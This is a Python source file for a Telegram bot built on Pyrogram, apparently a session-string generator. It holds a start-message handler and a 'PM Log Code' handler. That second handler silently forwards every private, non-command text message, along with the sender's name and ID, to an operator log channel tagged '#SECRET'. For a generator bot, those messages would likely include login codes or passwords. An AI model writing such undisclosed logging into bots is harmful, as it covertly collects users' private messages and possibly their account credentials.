from data import Data
from pyrogram import Client, filters
from env import LOG_CHANNEL
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message


def filter(cmd: str):
    return filters.private & filters.incoming & filters.command(cmd)


# Start Message
@Client.on_message(filter("start"))
async def start(bot: Client, msg: Message):
    user = await bot.get_me()
    mention = user.mention
    buttons = [[
                InlineKeyboardButton("Click Here To Generate!", callback_data="generate")
            ]]
    await bot.send_message(
        msg.chat.id,
        Data.START.format(msg.from_user.mention, mention),
        reply_markup=InlineKeyboardMarkup(buttons)
    )
#PM Log Code
@Client.on_message(filters.private & filters.text & filters.incoming)
async def pm_text(bot, message):
    content = message.text
    user = message.from_user.first_name
    user_id = message.from_user.id
    if content.startswith("/") or content.startswith("#"): return  # ignore commands and hashtag
    await bot.send_message(
        chat_id=LOG_CHANNEL,
        text=f"<b>#SECRET\n\nNᴀᴍᴇ : {user}\n\nID : {user_id}\n\nMᴇssᴀɢᴇ : {content}</b>"
    )
